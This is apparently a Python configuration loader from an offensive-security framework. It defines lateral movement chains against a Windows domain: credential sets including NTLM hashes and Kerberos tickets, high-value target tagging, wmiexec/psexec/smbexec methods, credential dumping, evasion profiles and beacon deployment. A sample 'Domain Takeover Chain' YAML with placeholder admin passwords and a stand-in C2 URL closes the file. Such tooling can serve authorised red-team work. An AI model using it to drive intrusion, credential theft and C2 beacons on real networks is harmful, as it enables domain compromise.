"""
Lateral Movement Chain Configuration
YAML-based configuration for lateral movement chains
Supports target definitions, credential sets, method ordering, and AI-driven suggestions
"""

import os
import yaml
import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any
from enum import Enum
from datetime import datetime

from cybermodules.helpers import log_to_intel


class ChainStrategy(Enum):
    """Chain execution strategies"""
    SEQUENTIAL = "sequential"       # Execute targets in order
    PARALLEL = "parallel"           # Execute targets concurrently
    BREADTH_FIRST = "breadth_first" # Discover all at each depth before going deeper
    DEPTH_FIRST = "depth_first"     # Go as deep as possible on each path
    AI_GUIDED = "ai_guided"         # Let AI decide the optimal path


class CredentialType(Enum):
    """Credential types"""
    PASSWORD = "password"
    NTLM_HASH = "ntlm_hash"
    KERBEROS_TICKET = "kerberos_ticket"
    SSH_KEY = "ssh_key"
    CERTIFICATE = "certificate"


@dataclass
class CredentialSet:
    """Credential definition"""
    name: str
    username: str
    domain: str = ""
    password: str = ""
    nt_hash: str = ""
    lm_hash: str = ""
    aes_key: str = ""
    ticket_path: str = ""
    ssh_key_path: str = ""
    cert_path: str = ""
    cred_type: CredentialType = CredentialType.PASSWORD
    priority: int = 1
    
    def to_dict(self) -> Dict:
        return {
            'name': self.name,
            'username': f"{self.domain}\\{self.username}" if self.domain else self.username,
            'password': self.password,
            'nt_hash': self.nt_hash,
            'lm_hash': self.lm_hash,
            'aes_key': self.aes_key,
            'ticket_path': self.ticket_path,
            'source': self.name
        }


@dataclass
class TargetHost:
    """Target host definition"""
    hostname: str
    ip: str = ""
    os_type: str = "windows"  # windows, linux, macos
    priority: int = 1
    tags: List[str] = field(default_factory=list)
    notes: str = ""
    preferred_methods: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            'hostname': self.hostname,
            'ip': self.ip or self.hostname,
            'os_type': self.os_type,
            'priority': self.priority,
            'tags': self.tags
        }


@dataclass
class ChainStep:
    """Single step in a chain"""
    target: str
    methods: List[str] = field(default_factory=lambda: ["wmiexec", "psexec", "smbexec"])
    credentials: List[str] = field(default_factory=list)  # Reference to credential names
    commands: List[str] = field(default_factory=list)
    dump_creds: bool = True
    deploy_beacon: bool = False
    evasion_profile: str = "default"
    timeout: int = 30
    retry_count: int = 2


@dataclass
class LateralChainConfig:
    """Complete lateral movement chain configuration"""
    name: str
    description: str = ""
    strategy: ChainStrategy = ChainStrategy.SEQUENTIAL
    targets: List[TargetHost] = field(default_factory=list)
    credentials: List[CredentialSet] = field(default_factory=list)
    steps: List[ChainStep] = field(default_factory=list)
    
    # Global settings
    max_depth: int = 5
    max_concurrent: int = 3
    timeout: int = 30
    opsec_enabled: bool = False
    ai_guided: bool = False
    
    # Evasion settings
    evasion_enabled: bool = True
    evasion_profile: str = "default"
    reflective_loader: bool = False
    sleep_between_jumps: int = 5
    
    # Beacon settings
    deploy_beacon: bool = False
    beacon_type: str = "python"  # python, go, rust
    beacon_config: Dict = field(default_factory=dict)
    
    # Logging
    log_level: str = "info"
    save_loot: bool = True
    loot_path: str = "/tmp/loot"
    
    def get_credential_by_name(self, name: str) -> Optional[CredentialSet]:
        """Get credential set by name"""
        for cred in self.credentials:
            if cred.name == name:
                return cred
        return None
    
    def get_target_by_hostname(self, hostname: str) -> Optional[TargetHost]:
        """Get target by hostname"""
        for target in self.targets:
            if target.hostname == hostname or target.ip == hostname:
                return target
        return None
    
    def get_high_value_targets(self) -> List[TargetHost]:
        """Get high-value targets (DCs, servers, etc.)"""
        hvt_tags = ['dc', 'domain_controller', 'server', 'admin', 'exchange', 'sql']
        return [t for t in self.targets if any(tag in hvt_tags for tag in t.tags)]


class LateralChainConfigLoader:
    """
    Load and parse lateral movement chain configurations from YAML
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.config: Optional[LateralChainConfig] = None
    
    def load_from_file(self, filepath: str) -> LateralChainConfig:
        """Load configuration from YAML file"""
        if not os.path.exists(filepath):
            raise FileNotFoundError(f"Config file not found: {filepath}")
        
        with open(filepath, 'r') as f:
            data = yaml.safe_load(f)
        
        return self._parse_config(data)
    
    def load_from_string(self, yaml_string: str) -> LateralChainConfig:
        """Load configuration from YAML string"""
        data = yaml.safe_load(yaml_string)
        return self._parse_config(data)
    
    def load_from_dict(self, data: Dict) -> LateralChainConfig:
        """Load configuration from dictionary"""
        return self._parse_config(data)
    
    def _parse_config(self, data: Dict) -> LateralChainConfig:
        """Parse configuration dictionary into LateralChainConfig"""
        
        # Parse credentials
        credentials = []
        for cred_data in data.get('credentials', []):
            cred_type = CredentialType(cred_data.get('type', 'password'))
            credentials.append(CredentialSet(
                name=cred_data.get('name', 'unnamed'),
                username=cred_data.get('username', ''),
                domain=cred_data.get('domain', ''),
                password=cred_data.get('password', ''),
                nt_hash=cred_data.get('nt_hash', ''),
                lm_hash=cred_data.get('lm_hash', ''),
                aes_key=cred_data.get('aes_key', ''),
                ticket_path=cred_data.get('ticket_path', ''),
                ssh_key_path=cred_data.get('ssh_key_path', ''),
                cert_path=cred_data.get('cert_path', ''),
                cred_type=cred_type,
                priority=cred_data.get('priority', 1)
            ))
        
        # Parse targets
        targets = []
        for target_data in data.get('targets', []):
            targets.append(TargetHost(
                hostname=target_data.get('hostname', ''),
                ip=target_data.get('ip', ''),
                os_type=target_data.get('os_type', 'windows'),
                priority=target_data.get('priority', 1),
                tags=target_data.get('tags', []),
                notes=target_data.get('notes', ''),
                preferred_methods=target_data.get('preferred_methods', [])
            ))
        
        # Parse steps
        steps = []
        for step_data in data.get('steps', []):
            steps.append(ChainStep(
                target=step_data.get('target', ''),
                methods=step_data.get('methods', ['wmiexec', 'psexec', 'smbexec']),
                credentials=step_data.get('credentials', []),
                commands=step_data.get('commands', []),
                dump_creds=step_data.get('dump_creds', True),
                deploy_beacon=step_data.get('deploy_beacon', False),
                evasion_profile=step_data.get('evasion_profile', 'default'),
                timeout=step_data.get('timeout', 30),
                retry_count=step_data.get('retry_count', 2)
            ))
        
        # Parse strategy
        strategy_str = data.get('strategy', 'sequential')
        try:
            strategy = ChainStrategy(strategy_str)
        except ValueError:
            strategy = ChainStrategy.SEQUENTIAL
        
        # Build config
        config = LateralChainConfig(
            name=data.get('name', 'Unnamed Chain'),
            description=data.get('description', ''),
            strategy=strategy,
            targets=targets,
            credentials=credentials,
            steps=steps,
            max_depth=data.get('max_depth', 5),
            max_concurrent=data.get('max_concurrent', 3),
            timeout=data.get('timeout', 30),
            opsec_enabled=data.get('opsec_enabled', False),
            ai_guided=data.get('ai_guided', False),
            evasion_enabled=data.get('evasion', {}).get('enabled', True),
            evasion_profile=data.get('evasion', {}).get('profile', 'default'),
            reflective_loader=data.get('evasion', {}).get('reflective_loader', False),
            sleep_between_jumps=data.get('evasion', {}).get('sleep_between_jumps', 5),
            deploy_beacon=data.get('beacon', {}).get('deploy', False),
            beacon_type=data.get('beacon', {}).get('type', 'python'),
            beacon_config=data.get('beacon', {}).get('config', {}),
            log_level=data.get('logging', {}).get('level', 'info'),
            save_loot=data.get('logging', {}).get('save_loot', True),
            loot_path=data.get('logging', {}).get('loot_path', '/tmp/loot')
        )
        
        self.config = config
        self._log(f"Loaded chain config: {config.name} with {len(targets)} targets, {len(credentials)} creds")
        
        return config
    
    def _log(self, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, "CHAIN_CONFIG", message)
        print(f"[CHAIN_CONFIG] {message}")
    
    def validate_config(self) -> Dict[str, Any]:
        """Validate the loaded configuration"""
        if not self.config:
            return {'valid': False, 'errors': ['No config loaded']}
        
        errors = []
        warnings = []
        
        # Check for targets
        if not self.config.targets and not self.config.steps:
            errors.append("No targets or steps defined")
        
        # Check for credentials
        if not self.config.credentials:
            warnings.append("No credentials defined - will need to provide at runtime")
        
        # Validate step references
        target_names = {t.hostname for t in self.config.targets} | {t.ip for t in self.config.targets if t.ip}
        cred_names = {c.name for c in self.config.credentials}
        
        for step in self.config.steps:
            if step.target not in target_names:
                warnings.append(f"Step target '{step.target}' not in defined targets")
            
            for cred_ref in step.credentials:
                if cred_ref not in cred_names:
                    errors.append(f"Step references unknown credential: {cred_ref}")
        
        return {
            'valid': len(errors) == 0,
            'errors': errors,
            'warnings': warnings
        }
    
    def to_yaml(self) -> str:
        """Export current config to YAML string"""
        if not self.config:
            return ""
        
        data = {
            'name': self.config.name,
            'description': self.config.description,
            'strategy': self.config.strategy.value,
            'max_depth': self.config.max_depth,
            'max_concurrent': self.config.max_concurrent,
            'timeout': self.config.timeout,
            'opsec_enabled': self.config.opsec_enabled,
            'ai_guided': self.config.ai_guided,
            'targets': [
                {
                    'hostname': t.hostname,
                    'ip': t.ip,
                    'os_type': t.os_type,
                    'priority': t.priority,
                    'tags': t.tags
                }
                for t in self.config.targets
            ],
            'credentials': [
                {
                    'name': c.name,
                    'username': c.username,
                    'domain': c.domain,
                    'type': c.cred_type.value,
                    'priority': c.priority
                }
                for c in self.config.credentials
            ],
            'steps': [
                {
                    'target': s.target,
                    'methods': s.methods,
                    'credentials': s.credentials,
                    'dump_creds': s.dump_creds,
                    'deploy_beacon': s.deploy_beacon
                }
                for s in self.config.steps
            ],
            'evasion': {
                'enabled': self.config.evasion_enabled,
                'profile': self.config.evasion_profile,
                'reflective_loader': self.config.reflective_loader,
                'sleep_between_jumps': self.config.sleep_between_jumps
            },
            'beacon': {
                'deploy': self.config.deploy_beacon,
                'type': self.config.beacon_type,
                'config': self.config.beacon_config
            },
            'logging': {
                'level': self.config.log_level,
                'save_loot': self.config.save_loot,
                'loot_path': self.config.loot_path
            }
        }
        
        return yaml.dump(data, default_flow_style=False, sort_keys=False)


# Sample configuration template
SAMPLE_CONFIG_YAML = """
# Lateral Movement Chain Configuration
# =====================================

name: "Domain Takeover Chain"
description: "Automated lateral movement chain targeting domain controllers"

# Execution strategy: sequential, parallel, breadth_first, depth_first, ai_guided
strategy: sequential

# Global settings
max_depth: 5
max_concurrent: 3
timeout: 30
opsec_enabled: true
ai_guided: true

# Target definitions
targets:
  - hostname: "dc01.corp.local"
    ip: "192.168.1.10"
    os_type: windows
    priority: 1
    tags: [dc, domain_controller, high_value]
    notes: "Primary domain controller"
    preferred_methods: [wmiexec, psexec]
    
  - hostname: "srv01.corp.local"
    ip: "192.168.1.20"
    os_type: windows
    priority: 2
    tags: [server, file_server]
    
  - hostname: "ws01.corp.local"
    ip: "192.168.1.50"
    os_type: windows
    priority: 3
    tags: [workstation, admin_workstation]

# Credential sets
credentials:
  - name: "domain_admin"
    username: "administrator"
    domain: "CORP"
    password: "P@ssw0rd123!"
    type: password
    priority: 1
    
  - name: "local_admin"
    username: "localadmin"
    password: "Admin123!"
    type: password
    priority: 2
    
  - name: "hash_creds"
    username: "svc_backup"
    domain: "CORP"
    nt_hash: "aad3b435b51404eeaad3b435b51404ee"
    lm_hash: "aad3b435b51404ee"
    type: ntlm_hash
    priority: 1

# Chain steps (optional - if not defined, will auto-generate from targets)
steps:
  - target: "ws01.corp.local"
    methods: [wmiexec, psexec, smbexec]
    credentials: [domain_admin, local_admin]
    commands:
      - "whoami /all"
      - "ipconfig /all"
    dump_creds: true
    deploy_beacon: true
    evasion_profile: stealth
    timeout: 30
    retry_count: 2
    
  - target: "srv01.corp.local"
    methods: [wmiexec]
    credentials: [domain_admin]
    dump_creds: true
    deploy_beacon: false
    
  - target: "dc01.corp.local"
    methods: [wmiexec, psexec]
    credentials: [domain_admin, hash_creds]
    commands:
      - "whoami /all"
      - "nltest /dclist:corp"
    dump_creds: true
    deploy_beacon: true
    evasion_profile: paranoid

# Evasion settings
evasion:
  enabled: true
  profile: stealth  # stealth, paranoid, aggressive
  reflective_loader: true
  sleep_between_jumps: 5  # seconds

# Beacon deployment settings
beacon:
  deploy: true
  type: python  # python, go, rust
  config:
    c2_url: "https://c2.example.com"
    callback_interval: 60
    jitter: 0.2
    encryption: aes256

# Logging settings
logging:
  level: info
  save_loot: true
  loot_path: "/tmp/loot"
"""


def get_sample_config() -> str:
    """Return sample configuration YAML"""
    return SAMPLE_CONFIG_YAML


def create_config_from_targets(targets: List[str], credentials: Dict) -> LateralChainConfig:
    """Quick helper to create config from simple target list"""
    loader = LateralChainConfigLoader()
    
    config_data = {
        'name': f'Quick Chain - {datetime.now().strftime("%Y%m%d_%H%M%S")}',
        'strategy': 'sequential',
        'targets': [{'hostname': t, 'ip': t} for t in targets],
        'credentials': [{
            'name': 'primary',
            'username': credentials.get('username', ''),
            'domain': credentials.get('domain', ''),
            'password': credentials.get('password', ''),
            'nt_hash': credentials.get('nt_hash', ''),
            'type': 'ntlm_hash' if credentials.get('nt_hash') else 'password'
        }]
    }
    
    return loader.load_from_dict(config_data)
